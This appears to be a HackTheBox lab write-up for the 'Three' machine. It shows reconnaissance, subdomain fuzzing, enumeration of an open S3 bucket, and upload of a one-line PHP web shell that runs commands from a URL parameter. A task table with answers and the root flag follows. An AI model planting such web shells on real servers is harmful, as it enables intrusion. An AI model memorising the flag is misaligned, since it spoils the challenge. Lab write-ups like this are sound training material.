TITLE: Three
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Three.png
---

# Three

Three is a machine that focuses on AWS S3 bucket enumeration and exploitation to gain remote command execution.

## Recon

Nmap reveals ports 80 (HTTP) and 22 (SSH).

```bash
nmap -sC -sV 10.129.171.104
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache httpd 2.4.29 |

The web server hosts a static site for "The Toppers". We add `thetoppers.htb` to our `/etc/hosts`.

### Subdomain Enumeration

We use `ffuf` to search for subdomains:

```bash
ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -w /usr/share/wordlists/dirb/common.txt -fs 11952
```

We discover `s3.thetoppers.htb`.

## Exploitation

### S3 Enumeration

We use the AWS CLI to interact with the S3 bucket.

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

The bucket contains the website's source code.

### Web Shell Upload

We can upload a simple PHP web shell to the bucket:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Now we can execute commands through the browser:
`http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt`

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | How many ports are open on the machine? | `2` |
| 2 | What is the domain of the website? | `thetoppers.htb` |
| 3 | What is the subdomain that is used for storage? | `s3.thetoppers.htb` |
| 4 | What is the command used to list the buckets? | `aws s3 ls` |
| 5 | What is the name of the tool used to interact with the S3 bucket? | `awscli` |
| 6 | What is the name of the flag file? | `flag.txt` |
| 7 | Submit root flag | `a980d992830fde6f43276662760920f4` |
